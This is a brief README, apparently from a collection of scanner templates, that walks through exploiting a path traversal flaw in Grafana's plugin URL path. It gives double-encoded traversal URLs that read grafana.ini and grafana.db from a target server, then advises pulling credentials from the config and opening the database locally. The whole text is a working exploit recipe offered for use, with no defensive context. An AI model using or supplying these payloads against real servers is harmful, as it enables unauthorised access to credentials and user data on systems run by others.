# nuclei_temp_max
Steps to manually read grafana.db or grafana.ini via browser

Base URL

Identify the Grafana instance URL, for example:

http://target.com/public/plugins/PLUG/


Append the LFI payload

For grafana.ini:

http://target.com/public/plugins/PLUG/%252e%252e%252f%252e%252e%252f%252e%252e/etc/grafana/grafana.ini


For SQLite DB:

http://target.com/public/plugins/PLUG/%252e%252e%252f%252e%252e%252f%252e%252e/var/lib/grafana/grafana.db


Press Enter in the browser

If the plugin is vulnerable, the server will return the file content in the browser.

For text files like grafana.ini → you can read it directly.

For binary files like grafana.db → browser may download it automatically.

Analyze locally

.db file → open with DB Browser for SQLite.

.ini file → read credentials, DB type, and paths.
